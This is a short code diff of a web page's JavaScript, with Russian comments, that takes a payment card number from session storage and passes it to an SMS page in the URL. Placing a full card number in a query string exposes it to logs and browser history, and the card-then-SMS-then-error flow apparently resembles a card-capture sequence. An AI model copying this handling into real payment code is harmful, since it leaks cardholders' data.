@@ -736,10 +736,12 @@
         };
 
         window.redirectToSMS = function() {
-        // Берем номер карты из предыдущей страницы или используем дефолтный
-        const cardNumber = sessionStorage.getItem('cardNumber') || '0000000000000000';
-        window.location.href = `sms.html?card=${cardNumber}`;
-        };
+    // Берем номер карты из данных формы
+    const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+    const cardNumber = formData.cardNumber || '0000000000000000';
+    sessionStorage.setItem('cardNumber', cardNumber);
+    window.location.href = `sms.html?card=${cardNumber}`;
+};
 
         window.redirectToPaymentWithError = function() {
             console.log('❌ Перенаправляю на payment.html с ошибкой');
@@ -765,5 +767,6 @@
     </script>
 </body>
 </html>
+
 
 
